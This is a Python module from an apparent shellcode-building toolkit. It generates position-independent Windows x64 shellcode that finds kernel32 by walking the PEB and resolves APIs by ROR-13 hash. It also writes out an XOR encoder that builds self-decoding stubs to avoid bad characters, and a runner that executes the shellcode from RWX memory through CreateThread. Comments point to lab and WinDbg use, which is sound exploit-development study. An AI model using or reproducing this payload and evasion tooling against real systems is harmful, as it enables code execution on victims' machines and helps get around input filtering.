"""x64 assembly build pipeline: compose full x64 shellcode assembly.

Generates position-independent Windows x64 shellcode using:
  - GS:[0x60] PEB access
  - PE32+ export directory parsing
  - Microsoft x64 calling convention
  - RSP-relative stack frame (no frame pointer)

Entry state assumptions:
  - RSP is 8-byte aligned (misaligned from 16-byte boundary, standard after CALL)
  - No register contents assumed
  - Execution starts at _start label
"""
from __future__ import annotations

import argparse
import os
import sys
from datetime import UTC, datetime

from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE, STRUCT_DATABASE_X64
from .encode_x64 import (
    encode_dword_into_r64,
    safe_call_mem_x64,
    safe_dword_store_x64,
    safe_lea_x64,
    safe_mem_load_x64,
    safe_qword_store,
)
from .payload_templates.base import PayloadTemplate, TemplateConfig
from .schema import Manifest
from .stack_alloc_x64 import StackLayoutX64


def _build_timestamp() -> str:
    epoch = os.environ.get("SOURCE_DATE_EPOCH", "0")
    if epoch.lower() == "now":
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dt = datetime.fromtimestamp(int(epoch), tz=UTC)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


def _emit_framework_stubs_x64(badchars: set[int]) -> str:
    """Generate x64 PEB-walk and export resolution framework stubs.

    x64 PEB access: GS:[0x60]
    x64 PE32+: export directory at PE+0x88 (data directory index 0)
    InInitializationOrderModuleList is at PEB_LDR_DATA+0x30
    Module base at LDR_DATA_TABLE_ENTRY+0x20 (DllBase, InInitOrder)
    BaseDllName at +0x48 (InInitOrder offset)
    """
    lines: list[str] = []

    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
    lines.append("get_first_ldr_entry:")
    lines.append("    xor  ecx, ecx")
    lines.append("    mov  rax, gs:[rcx + 0x60]")
    lines.extend(safe_mem_load_x64("rax", "rax", 0x18, badchars))
    lines.extend(safe_mem_load_x64("rax", "rax", 0x30, badchars))
    lines.append("    sub  rax, 0x10")
    lines.append("    ret")
    lines.append("")

    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL (UTF-16LE)
    # Bounded to 64 iterations to prevent infinite loop on corrupted list.
    lines.append("find_kernel32_entry:")
    lines.extend(safe_mem_load_x64("rsi", "rax", 0x48, badchars))
    lines.append("    cmp  word ptr [rsi], 0x004b")
    lines.append("    jne  next_module")
    lines.append("    cmp  word ptr [rsi+2], 0x0045")
    lines.append("    jne  next_module")
    lines.append("    cmp  word ptr [rsi+12], 0x0033")
    lines.append("    jne  next_module")
    lines.extend(safe_mem_load_x64("rbx", "rax", 0x20, badchars))
    lines.append("    ret")
    lines.append("")

    # next_module: advance to next module in list (bounded)
    lines.append("next_module:")
    lines.append("    dec  r15d")
    lines.append("    jz   module_not_found")
    lines.extend(safe_mem_load_x64("rax", "rax", 0x10, badchars))
    lines.append("    sub  rax, 0x10")
    lines.append("    jmp  find_kernel32_entry")
    lines.append("")

    # module_not_found: hard stop (int3 = debug break exception).
    # Assumption: shellcode is terminal (never returns to caller).
    # If return-to-caller is needed, replace int3 with a configurable
    # failure mode that restores the stack and returns an error code.
    lines.append("module_not_found:")
    lines.append("    int3")
    lines.append("")

    # find_module: entry point for PEB walk
    lines.append("find_module:")
    lines.append("    mov  r15d, 0x40")
    lines.append("    call get_first_ldr_entry")
    lines.append("    jmp  find_kernel32_entry")
    lines.append("")

    # get_export_directory: PE32+ header -> export directory RVA
    # PE signature at [ImageBase + e_lfanew]
    # Export directory RVA at PE + 0x88 (data directories start at 0x70 for PE32+, entry 0 is export)
    lines.append("get_export_directory:")
    lines.append("    mov  eax, dword ptr [rbx + 0x3c]")
    lines.append("    add  rax, rbx")
    lines.append("    mov  eax, dword ptr [rax + 0x88]")
    lines.append("    add  rax, rbx")
    lines.append("    ret")
    lines.append("")

    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
    lines.append("get_export_tables:")
    lines.append("    mov  ecx, dword ptr [rax + 0x18]")
    lines.append("    mov  edi, dword ptr [rax + 0x20]")
    lines.append("    add  rdi, rbx")
    lines.append("    mov  edx, dword ptr [rax + 0x24]")
    lines.append("    add  rdx, rbx")
    lines.append("    mov  esi, dword ptr [rax + 0x1c]")
    lines.append("    add  rsi, rbx")
    lines.append("    ret")
    lines.append("")

    # save_export_context: store to RSP-relative frame
    # Uses fixed offsets in the "export context" area (first 0x40 bytes)
    lines.append("save_export_context:")
    lines.append("    mov  qword ptr [rbp - 0x08], rbx")
    lines.append("    mov  qword ptr [rbp - 0x10], rdi")
    lines.append("    mov  qword ptr [rbp - 0x18], rdx")
    lines.append("    mov  qword ptr [rbp - 0x20], rsi")
    lines.append("    mov  qword ptr [rbp - 0x28], rcx")
    lines.append("    ret")
    lines.append("")

    # compute_hash: ROR-13 hash of null-terminated ASCII string at RSI
    lines.append("compute_hash:")
    lines.append("    xor  eax, eax")
    lines.append("    xor  edx, edx")
    lines.append("    cld")
    lines.append("")
    lines.append("hash_loop:")
    lines.append("    lodsb")
    lines.append("    test al, al")
    lines.append("    jz   hash_done")
    lines.append("    ror  edx, 0x0d")
    lines.append("    movzx eax, al")
    lines.append("    add  edx, eax")
    lines.append("    jmp  hash_loop")
    lines.append("")
    lines.append("hash_done:")
    lines.append("    ret")
    lines.append("")

    # resolve_matched_export: ordinal -> function address (PE32+)
    # AddressOfNameOrdinals entries are 16-bit, AddressOfFunctions entries are 32-bit RVAs
    # Limitation: forwarded exports (RVA inside export dir) are not detected.
    # A forwarded export resolves to an ASCII redirect string, not code.
    # Current targets (kernel32, ws2_32) do not forward the APIs we resolve.
    lines.append("resolve_matched_export:")
    lines.append("    mov  rdx, qword ptr [rbp - 0x18]")
    lines.append("    movzx eax, word ptr [rdx + rcx*2]")
    lines.append("    mov  rsi, qword ptr [rbp - 0x20]")
    lines.append("    mov  eax, dword ptr [rsi + rax*4]")
    lines.append("    mov  rcx, qword ptr [rbp - 0x08]")
    lines.append("    add  rax, rcx")
    lines.append("    ret")
    lines.append("")

    # resolve_export_by_hash: loop through exports comparing hashes
    lines.append("resolve_export_by_hash:")
    lines.append("    mov  qword ptr [rbp - 0x30], rax")
    lines.append("    xor  ecx, ecx")
    lines.append("")
    lines.append("find_export_loop:")
    lines.append("    mov  rdi, qword ptr [rbp - 0x10]")
    lines.append("    mov  eax, dword ptr [rdi + rcx*4]")
    lines.append("    mov  rdi, qword ptr [rbp - 0x08]")
    lines.append("    add  rax, rdi")
    lines.append("    mov  rsi, rax")
    lines.append("    push rcx")
    lines.append("    call compute_hash")
    lines.append("    pop  rcx")
    lines.append("    mov  rax, qword ptr [rbp - 0x30]")
    lines.append("    cmp  edx, eax")
    lines.append("    je   resolve_matched_export")
    lines.append("")
    lines.append("inc_next:")
    lines.append("    inc  ecx")
    lines.append("    mov  eax, dword ptr [rbp - 0x28]")
    lines.append("    cmp  ecx, eax")
    lines.append("    jl   find_export_loop")
    lines.append("")
    lines.append("    ; export not found: hard stop (int3 = debug break exception).")
    lines.append("    ; Same terminal-shellcode assumption as module_not_found.")
    lines.append("    int3")

    return "\n".join(lines)


def _emit_stack_reserve_x64(frame_size: int, badchars: set[int]) -> list[str]:
    """Emit badchar-safe sub rsp, frame_size."""
    lines = list(encode_dword_into_r64(frame_size, badchars, "r11"))
    lines.append("    sub  rsp, r11")
    return lines


def _dll_load_block_x64(dll: str, manifest: Manifest, layout: StackLayoutX64) -> str:
    """Generate the LoadLibraryA block for a secondary DLL (x64).

    Constructs the DLL name in a pre-allocated string slot and passes
    its address via RCX. Does not modify RSP (fixed-frame invariant).
    """
    loadlib_slot = layout.slot("LoadLibraryA")
    module_slot = layout.slot(dll)
    bc = manifest.badchars

    dll_label = None
    for entry in manifest.strings:
        if entry.value == dll:
            dll_label = entry.label
            break
    if dll_label is None:
        raise ValueError(
            f"DLL '{dll}' loaded via LoadLibraryA requires a string entry in "
            f"the manifest. Add a string with value '{dll}' to the strings list."
        )

    dll_slot = layout.slot(dll_label)
    raw = dll.encode("ascii") + b"\x00"

    lines: list[str] = [
        f"; -- Loading {dll} via LoadLibraryA (x64) --",
        "",
        f"    ; construct '{dll}' in string slot [{dll_label}]",
        "    xor  eax, eax",
    ]

    for i in range(0, len(raw), 4):
        chunk = raw[i:i + 4]
        val = int.from_bytes(chunk.ljust(4, b"\x00"), "little")
        if val == 0:
            lines.extend(safe_dword_store_x64("rsp", dll_slot.offset + i, "eax", bc))
        else:
            lines.extend(encode_dword_into_r64(val, bc, "r11"))
            lines.extend(safe_dword_store_x64("rsp", dll_slot.offset + i, "r11d", bc))

    lines.extend(safe_lea_x64("rcx", "rsp", dll_slot.offset, bc))
    lines.extend(safe_call_mem_x64("rsp", loadlib_slot.offset, bc))
    lines.extend(safe_qword_store("rsp", module_slot.offset, "rax", bc))
    lines.append(f"    ; {dll} base")
    lines.append("")

    lines.extend(safe_mem_load_x64("rbx", "rsp", module_slot.offset, bc))
    lines.append("    call get_export_directory")
    lines.append("    call get_export_tables")
    lines.append("    call save_export_context")
    lines.append("")

    return "\n".join(lines)


def _emit_api_resolution_x64(
    manifest: Manifest, layout: StackLayoutX64, dll: str,
) -> str:
    """Emit hash-based API resolution stubs for a DLL's functions (x64)."""
    from .hash_gen import ror13

    bc = manifest.badchars
    lines: list[str] = []
    module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == dll]

    for func_name in module_funcs:
        h = ror13(func_name)
        slot = layout.slot(func_name)
        lines.append(f"    ; resolve {func_name} (hash 0x{h:08x})")
        lines.extend(encode_dword_into_r64(h, bc, "rax"))
        lines.append("    call resolve_export_by_hash")
        lines.extend(safe_qword_store("rsp", slot.offset, "rax", bc))
        lines.append("")

    return "\n".join(lines)


def _emit_strings_x64(
    manifest: Manifest, layout: StackLayoutX64,
    skip_labels: set[str] | None = None,
) -> str:
    """Emit string construction for x64 (mov-based, into RSP-relative slots)."""
    from .encode_x64 import encode_dword_into_r64, safe_dword_store_x64

    bc = manifest.badchars
    skip = skip_labels or set()
    lines: list[str] = []

    for entry in manifest.strings:
        if entry.label in skip:
            continue
        slot = layout.slot(entry.label)
        raw = entry.value.encode("ascii") + b"\x00"
        base_offset = slot.offset

        lines.append(f"    ; string '{entry.label}' = \"{entry.value}\"")
        lines.append("    xor  eax, eax")

        # Write in 4-byte chunks
        for i in range(0, len(raw), 4):
            chunk = raw[i:i + 4]
            val = int.from_bytes(chunk.ljust(4, b"\x00"), "little")
            if val == 0:
                lines.extend(safe_dword_store_x64("rsp", base_offset + i, "eax", bc))
            else:
                lines.extend(encode_dword_into_r64(val, bc, "r11"))
                lines.extend(safe_dword_store_x64("rsp", base_offset + i, "r11d", bc))

        # Null terminator is already included in the raw bytes
        lines.append("")

    return "\n".join(lines)


def _emit_struct_init_x64(
    manifest: Manifest, layout: StackLayoutX64,
) -> str:
    """Emit structure zero-initialization for x64."""
    from .api_database import STRUCT_DATABASE_X64

    bc = manifest.badchars
    lines: list[str] = []

    seen: set[str] = set()
    for func_name in manifest.functions:
        for struct_name in API_DATABASE[func_name].requires_structs:
            if struct_name in seen:
                continue
            seen.add(struct_name)

            st_rec = STRUCT_DATABASE_X64.get(struct_name)
            if st_rec is None:
                from .api_database import STRUCT_DATABASE
                st_rec = STRUCT_DATABASE.get(struct_name)
            if st_rec is None:
                continue

            slot = layout.slot(struct_name)
            size = st_rec.size
            qwords = size // 8

            lines.append(f"    ; zero {struct_name} (0x{size:x} bytes)")
            lines.append("    xor  eax, eax")
            lines.extend(safe_lea_x64("rdi", "rsp", slot.offset, bc))

            if qwords <= 6:
                for i in range(qwords):
                    lines.extend(safe_qword_store("rdi", i * 8, "rax", bc))
            else:
                lines.append(f"    mov  ecx, 0x{qwords:02x}")
                lines.append("    rep  stosq")

            lines.append("")

    return "\n".join(lines)


def compose_asm_x64(
    manifest: Manifest,
    layout: StackLayoutX64,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full x64 assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"
    bc = config.badchars

    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "[BITS 64]",
        "; AUTO-GENERATED by emitter-v1 (x64)",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {_build_timestamp()}",
        "",
        "    _start:",
        "        jmp _stub_trampoline",
        "",
        "; -- Framework Stubs (x64) --",
        "",
        _emit_framework_stubs_x64(bc),
        "",
        "_stub_trampoline:",
        "    jmp main",
        "",
        "; -- Main (x64) --",
        "",
        "main:",
        "    ; Establish stack frame",
        "    mov  rbp, rsp",
        "    and  rsp, -16",
        *_emit_stack_reserve_x64(layout.frame_size, bc),
        "",
        "    ; Bootstrap: find kernel32 via PEB walk (GS:[0x60])",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    # API resolution per module
    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                raise ValueError(
                    f"Manifest uses APIs from {mi.dll} but does not declare "
                    f"LoadLibraryA. Add LoadLibraryA to the functions list."
                )
            parts.append(_dll_load_block_x64(mi.dll, manifest, layout))

        resolution = _emit_api_resolution_x64(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    # String construction
    parts += [
        "; -- String Construction (x64) --",
        "",
    ]
    str_asm = _emit_strings_x64(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    # Structure initialization (skipped when workflow template handles it)
    from .workflow.reference import WorkflowTemplate as _WT
    if isinstance(template, _WT):
        parts += [
            "; -- Structure Initialization (x64) --",
            "; (handled by workflow IR ZeroStruct operations)",
            "",
        ]
    else:
        parts += [
            "; -- Structure Initialization (x64) --",
            "",
        ]
        struct_asm = _emit_struct_init_x64(manifest, layout)
        if struct_asm.strip():
            parts.append(struct_asm)
        else:
            parts += ["; (no structures)", ""]

    # Payload
    parts += [
        "; -- Payload (x64) --",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template - insert payload assembly here)", ""]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


def generate_xor_wrapper(arch: str = "x86", badchars: set[int] | None = None) -> str:
    """Generate a standalone XOR wrapper script for offline encoding.

    Works on any platform with Python 3.12+. No assembler needed.
    Reads shellcode.bin, XOR-encodes it, writes shellcode_encoded.bin.
    """
    bc_hex = ", ".join(f"0x{b:02x}" for b in sorted(badchars or {0x00, 0x0A, 0x0D}))
    return f'''\
#!/usr/bin/env python3
"""Standalone XOR encoder for {arch} shellcode.

Reads raw shellcode, XOR-encodes with a single-byte key that avoids
the specified badchars, prepends a self-decoding stub, and writes the
encoded output.

Usage:
    python xor_wrapper.py shellcode.bin
    python xor_wrapper.py shellcode.bin -o encoded.bin
    python xor_wrapper.py shellcode.bin --badchars 00,0a,0d,20
    python xor_wrapper.py shellcode.bin --key 0x41

No external dependencies. Works on any platform with Python 3.12+.
"""
import argparse
import struct
import sys


ARCH = "{arch}"
DEFAULT_BADCHARS = {{{bc_hex}}}


def find_xor_key(payload: bytes, badchars: set[int]) -> int | None:
    """Find a single-byte XOR key that produces no badchar bytes."""
    for key in range(1, 256):
        if key in badchars:
            continue
        if not any((b ^ key) in badchars for b in payload):
            return key
    return None


def build_decoder_stub_x86(payload_len: int, key: int, badchars: set[int]) -> bytes | None:
    """Build an x86 call/pop decoder stub."""
    small = payload_len <= 255
    for pad in range(16):
        parts: list[int] = []
        parts.extend([0x90] * pad)
        jmp1_idx = len(parts)
        parts.extend([0xEB, 0x00])
        decoder_offset = len(parts)
        parts.append(0x5E)
        parts.extend([0x31, 0xC9])
        if small:
            parts.extend([0xB1, payload_len & 0xFF])
        else:
            parts.extend([0x66, 0xB9, payload_len & 0xFF, (payload_len >> 8) & 0xFF])
        loop_target = len(parts)
        parts.extend([0x80, 0x36, key])
        parts.append(0x46)
        loop_instr = len(parts)
        parts.extend([0xE2, (loop_target - (loop_instr + 2)) & 0xFF])
        parts.extend([0xEB, 0x05])
        call_instr = len(parts)
        call_disp = decoder_offset - (call_instr + 5)
        parts.append(0xE8)
        parts.extend([(call_disp & 0xFFFFFFFF) >> (8 * i) & 0xFF for i in range(4)])
        parts[jmp1_idx + 1] = (call_instr - (jmp1_idx + 2)) & 0xFF
        stub = bytes(parts)
        if not any(b in badchars for b in stub):
            return stub
    return None


def build_decoder_stub_x64(payload_len: int, key: int, badchars: set[int]) -> bytes | None:
    """Build an x64 call/pop decoder stub (RCX loop, REX inc rsi)."""
    small = payload_len <= 255
    for pad in range(16):
        parts: list[int] = []
        parts.extend([0x90] * pad)
        jmp1_idx = len(parts)
        parts.extend([0xEB, 0x00])
        decoder_offset = len(parts)
        parts.append(0x5E)                      # pop rsi
        parts.extend([0x48, 0x31, 0xC9])        # xor rcx, rcx
        if small:
            parts.extend([0xB1, payload_len & 0xFF])  # mov cl, len
        else:
            parts.extend([0x66, 0xB9, payload_len & 0xFF, (payload_len >> 8) & 0xFF])
        loop_target = len(parts)
        parts.extend([0x80, 0x36, key])          # xor byte [rsi], key
        parts.extend([0x48, 0xFF, 0xC6])         # inc rsi
        loop_instr = len(parts)
        parts.extend([0xE2, (loop_target - (loop_instr + 2)) & 0xFF])  # loop
        parts.extend([0xEB, 0x05])               # jmp short payload
        call_instr = len(parts)
        call_disp = decoder_offset - (call_instr + 5)
        parts.append(0xE8)
        parts.extend([(call_disp & 0xFFFFFFFF) >> (8 * i) & 0xFF for i in range(4)])
        parts[jmp1_idx + 1] = (call_instr - (jmp1_idx + 2)) & 0xFF
        stub = bytes(parts)
        if not any(b in badchars for b in stub):
            return stub
    return None


def xor_encode(payload: bytes, badchars: set[int], arch: str,
               forced_key: int | None = None) -> tuple[bytes, dict]:
    """XOR-encode payload with decoder stub. Returns (encoded, info)."""
    if forced_key is not None:
        key = forced_key
        if key in badchars:
            return b"", {{"error": f"Key 0x{{key:02x}} is in the badchar set"}}
        if any((b ^ key) in badchars for b in payload):
            return b"", {{"error": f"Key 0x{{key:02x}} produces badchar bytes"}}
    else:
        key = find_xor_key(payload, badchars)
        if key is None:
            return b"", {{"error": "No valid XOR key found for this payload + badchar set"}}

    build_stub = build_decoder_stub_x64 if arch == "x64" else build_decoder_stub_x86
    stub = build_stub(len(payload), key, badchars)
    if stub is None:
        return b"", {{"error": f"Could not build clean decoder stub for key 0x{{key:02x}}"}}

    encoded_body = bytes(b ^ key for b in payload)
    full = stub + encoded_body

    if any(b in badchars for b in full):
        return b"", {{"error": "Final output still contains badchar bytes"}}

    return full, {{
        "key": key,
        "stub_size": len(stub),
        "payload_size": len(payload),
        "total_size": len(full),
        "arch": arch,
    }}


def main():
    parser = argparse.ArgumentParser(description="XOR encode shellcode")
    parser.add_argument("input", help="Raw shellcode .bin file")
    parser.add_argument("-o", "--output", default=None, help="Output file (default: shellcode_encoded.bin)")
    parser.add_argument("--badchars", default=None,
                        help="Comma-separated hex bytes (e.g. 00,0a,0d,20)")
    parser.add_argument("--key", default=None, help="Force a specific XOR key (e.g. 0x41)")
    parser.add_argument("--arch", default=ARCH, choices=["x86", "x64"],
                        help=f"Architecture (default: {{ARCH}})")
    args = parser.parse_args()

    payload = open(args.input, "rb").read()
    if not payload:
        print("[!] Empty input file", file=sys.stderr)
        sys.exit(1)

    badchars = DEFAULT_BADCHARS
    if args.badchars:
        badchars = set(int(b, 16) for b in args.badchars.split(","))

    forced_key = int(args.key, 16) if args.key else None

    encoded, info = xor_encode(payload, badchars, args.arch, forced_key)
    if not encoded:
        print(f"[!] {{info['error']}}", file=sys.stderr)
        sys.exit(1)

    out_path = args.output or "shellcode_encoded.bin"
    open(out_path, "wb").write(encoded)

    print(f"[+] Arch:       {{info['arch']}}")
    print(f"[+] Key:        0x{{info['key']:02x}}")
    print(f"[+] Stub:       {{info['stub_size']}} bytes")
    print(f"[+] Payload:    {{info['payload_size']}} bytes")
    print(f"[+] Total:      {{info['total_size']}} bytes")
    print(f"[+] Badchars:   {{' '.join(f'0x{{b:02x}}' for b in sorted(badchars))}}")
    print(f"[+] Output:     {{out_path}}")


if __name__ == "__main__":
    main()
'''


def generate_debug_runner_x64(asm: str) -> str:
    """Generate a self-contained Python debug script for x64 shellcode."""
    asm = asm.replace(";", "#")
    escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Debug runner for emitter-generated x64 shellcode.

Copy this file to the Windows lab VM, then:
  python debug_runner.py

Requires: pip install keystone-engine
This runner assembles 64-bit x64 shellcode. Run it under 64-bit Python.
"""
import ctypes
import sys

from keystone import KS_ARCH_X86, KS_MODE_64, Ks

CODE = r"""
{escaped_asm}
"""


def main():
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    cleaned = CODE.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(encoding)

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Instructions: {{count}}")
    print(f"[+] Shellcode:    {{len(shellcode)}} bytes")
    print(f"[+] Address:      {{ptr:#018x}}")
    print(f"[+] WinDbg:       bp {{ptr:#018x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _emit_contract_md_x64(
    manifest: Manifest, layout: StackLayoutX64, raw: bytes | None,
) -> str:
    """Generate a full contract document for x64 builds.

    Includes stack layout, API contracts with prototypes, structure layouts,
    and a WinDbg cheatsheet with x64-specific commands.
    """
    from .hash_gen import ror13

    lines: list[str] = []

    # -- Header --
    lines.append("# Shellcode Contract (x64)")
    lines.append("")
    lines.append("Generated from manifest.")
    lines.append("")
    lines.append("---")
    lines.append("")

    # -- Stack Layout --
    lines.append("# Stack Layout")
    lines.append("")
    lines.append("Architecture: x64 (64-bit, Microsoft calling convention)")
    lines.append(f"Frame: `sub rsp, 0x{layout.frame_size:x}` "
                 f"(0x{layout.frame_size:x} bytes reserved)")
    lines.append("Addressing: RSP-relative (fixed frame, RSP does not move after prologue)")
    if raw is not None:
        lines.append(f"Shellcode size: **{len(raw)} bytes** (0x{len(raw):x})")
    lines.append("")

    lines.append("## Export Context (reserved, framework use)")
    lines.append("")
    lines.append("| Offset | Description |")
    lines.append("|--------|-------------|")
    ctx_rows = [
        ("[RBP-0x08]", "Module base (transient)"),
        ("[RBP-0x10]", "AddressOfNames RVA"),
        ("[RBP-0x18]", "AddressOfNameOrdinals RVA"),
        ("[RBP-0x20]", "AddressOfFunctions RVA"),
        ("[RBP-0x28]", "NumberOfNames"),
        ("[RBP-0x30]", "Target hash (transient)"),
    ]
    for offset, desc in ctx_rows:
        lines.append(f"| `{offset}` | {desc} |")
    lines.append("")

    for category in ("module_base", "api", "variable", "structure", "string"):
        slots = layout.slots_by_category(category)
        if not slots:
            continue
        title = category.replace("_", " ").title()
        if category == "module_base":
            title = "Module Bases"
        elif category == "api":
            title = "API Pointers"
        lines.append(f"## {title}")
        lines.append("")
        if category == "api":
            lines.append("| Offset | API | Module | Hash |")
            lines.append("|--------|-----|--------|------|")
            for s in sorted(slots, key=lambda x: x.offset):
                rec = API_DATABASE[s.name]
                h = ror13(s.name)
                lines.append(
                    f"| `[RSP+0x{s.offset:03x}]` | {s.name} "
                    f"| {rec.module} | `0x{h:08x}` |"
                )
        elif category == "string":
            str_map = {se.label: se for se in manifest.strings}
            lines.append("| Offset | Label | Value | Size |")
            lines.append("|--------|-------|-------|------|")
            for s in sorted(slots, key=lambda x: x.offset):
                entry = str_map.get(s.name)
                value = entry.value if entry else ""
                lines.append(
                    f"| `[RSP+0x{s.offset:03x}]` | {s.name} "
                    f"| {value} | {s.size} |"
                )
        elif category == "structure":
            lines.append("| Offset | Structure | Size |")
            lines.append("|--------|-----------|------|")
            for s in sorted(slots, key=lambda x: x.offset):
                struct_db = STRUCT_DATABASE_X64 if s.name in STRUCT_DATABASE_X64 else STRUCT_DATABASE
                struct_rec = struct_db.get(s.name)
                sz = f"0x{struct_rec.size:x}" if struct_rec else str(s.size)
                lines.append(f"| `[RSP+0x{s.offset:03x}]` | {s.name} | {sz} |")
        else:
            lines.append("| Offset | Name | Size |")
            lines.append("|--------|------|------|")
            for s in sorted(slots, key=lambda x: x.offset):
                lines.append(f"| `[RSP+0x{s.offset:03x}]` | {s.name} | {s.size} |")
        lines.append("")

    if raw:
        lines.append(f"Shellcode size: {len(raw)} bytes")
        lines.append("")

    lines.append("---")
    lines.append("")

    # -- API Contracts --
    lines.append("# API Contracts")
    lines.append("")

    needed_modules: dict[str, list[str]] = {}
    for func_name in manifest.functions:
        dll = API_DATABASE[func_name].module
        needed_modules.setdefault(dll, []).append(func_name)

    ordered_dlls = [m.dll for m in MODULE_LOAD_ORDER if m.dll in needed_modules]

    for dll in ordered_dlls:
        lines.append(f"## {dll}")
        lines.append("")
        module_info = next(m for m in MODULE_LOAD_ORDER if m.dll == dll)
        if module_info.load_via == "peb":
            lines.append("Resolution: PEB walk (GS:[0x60], InInitializationOrderModuleList)")
        else:
            try:
                dll_slot = layout.slot(dll)
                lines.append(
                    f"Resolution: `LoadLibraryA(\"{dll}\")` stored at "
                    f"`[RSP+0x{dll_slot.offset:03x}]`"
                )
            except KeyError:
                lines.append(f"Resolution: `LoadLibraryA(\"{dll}\")`")
        lines.append("")

        for func_name in needed_modules[dll]:
            rec = API_DATABASE[func_name]
            h = ror13(func_name)
            try:
                slot = layout.slot(func_name)
                slot_ref = f"`[RSP+0x{slot.offset:03x}]`"
            except KeyError:
                slot_ref = "(no slot)"
            lines.append(f"### {func_name}")
            lines.append("")
            lines.append(f"**Slot:** {slot_ref}")
            lines.append(f"**Hash:** `0x{h:08x}`")
            lines.append(f"**Category:** {rec.category}")
            lines.append("")
            lines.append(f"```c\n{rec.prototype}\n```")
            lines.append("")
            if rec.arguments:
                lines.append("| # | Parameter | Type | Reg/Stack | Notes |")
                lines.append("|---|-----------|------|-----------|-------|")
                arg_regs = ["RCX", "RDX", "R8", "R9"]
                for i, arg in enumerate(rec.arguments):
                    loc = arg_regs[i] if i < 4 else f"[RSP+0x{0x20 + (i - 4) * 8:02x}]"
                    lines.append(
                        f"| {i + 1} | {arg.name} | {arg.type} | {loc} | {arg.notes} |"
                    )
            else:
                lines.append("No parameters.")
            lines.append("")
        lines.append("---")
        lines.append("")

    # -- Structure Layouts --
    struct_slots = layout.slots_by_category("structure")
    if struct_slots:
        lines.append("# Structure Layouts")
        lines.append("")

        required_by: dict[str, list[str]] = {}
        for func_name in manifest.functions:
            rec = API_DATABASE[func_name]
            for struct_name in rec.requires_structs:
                required_by.setdefault(struct_name, []).append(func_name)

        for slot in struct_slots:
            struct_db = STRUCT_DATABASE_X64 if slot.name in STRUCT_DATABASE_X64 else STRUCT_DATABASE
            struct_rec = struct_db.get(slot.name)
            if struct_rec is None:
                continue
            lines.append(f"## {slot.name}")
            lines.append("")
            lines.append(f"**Size:** `0x{struct_rec.size:x}`")
            lines.append(f"**Base:** `[RSP+0x{slot.offset:03x}]`")
            apis = required_by.get(slot.name, [])
            if apis:
                lines.append(f"**Required by:** {', '.join(apis)}")
            lines.append("")

            if struct_rec.fields:
                lines.append("| Offset | Field | Size | Notes |")
                lines.append("|--------|-------|------|-------|")
                for f in struct_rec.fields:
                    lines.append(
                        f"| `+0x{f.offset:02x}` | {f.name} | {f.size} | {f.notes} |"
                    )
            else:
                lines.append("Opaque output buffer (no field documentation).")
            lines.append("")
            lines.append("---")
            lines.append("")

    # -- WinDbg Cheatsheet (x64) --
    lines.append("# WinDbg Cheatsheet (x64)")
    lines.append("")
    lines.append("Run `debug_runner.py` under 64-bit Python on Windows.")
    lines.append("Attach WinDbg to the python.exe process. Set `bp <address>`")
    lines.append("using the printed shellcode address, then press Enter to execute.")
    lines.append("")

    lines.append("## Quick Reference")
    lines.append("")
    lines.append("| Command | Description |")
    lines.append("|---------|-------------|")
    lines.append("| `bp <addr>` | Set breakpoint |")
    lines.append("| `bl` | List breakpoints |")
    lines.append("| `g` | Go (continue) |")
    lines.append("| `t` | Step into |")
    lines.append("| `p` | Step over |")
    lines.append("| `pt` | Step to next return |")
    lines.append("| `r` | Show all registers |")
    lines.append("| `r rax` | Show one register |")
    lines.append("| `u rip L10` | Disassemble next 16 instructions |")
    lines.append("| `db <addr> L<n>` | Dump bytes |")
    lines.append("| `dq <addr> L<n>` | Dump qwords |")
    lines.append("| `da <addr>` | Dump ASCII string |")
    lines.append("| `!address <addr>` | Show memory region info |")
